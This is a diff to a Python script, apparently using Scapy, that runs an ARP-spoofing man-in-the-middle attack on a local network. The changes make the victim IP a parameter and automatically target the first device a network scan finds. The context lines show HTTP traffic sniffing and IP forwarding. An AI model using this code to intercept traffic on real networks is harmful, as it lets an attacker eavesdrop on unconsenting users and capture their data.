@@ -21,12 +21,12 @@ def packet_callback(packet):
 				print("\n{} ----HTTP----> {}:{}".format(packet[IP].src, packet[IP].dst, packet[IP].dport))
 				print(pkt[index1:index3]+"  "+pkt[index2:index4])
 
-def getInfo():
+def getInfo(victimIP):
 	print("~~~Getting addresses...")
 	#interface = input("interface:")
 	interface = "ens33"
 	#victimIP = input("victimIP:")
-	victimIP = "192.168.204.128"
+	# victimIP = "192.168.204.128"
 	routerIP = getRouterIP()
 	return [interface, victimIP, routerIP]
 
@@ -100,9 +100,9 @@ def sniffer(packet):
 	http_packet = packet
 	print (http_packet)
 
-def manInTheMiddle():
+def manInTheMiddle(victimIP):
 
-	info = getInfo()
+	info = getInfo(victimIP)
 	# print(info)
 	# info = ['en0', '162.246.145.218', '10.141.248.214']
 	setIPForwarding(True)
@@ -145,4 +145,4 @@ if __name__ == "__main__":
 	scan_all_device()
 	routerIP = str(getRouterIP()) + "/24"
 	device_list = get_device_list(routerIP)
-	manInTheMiddle()
+	manInTheMiddle(device_list[0]["ip"])
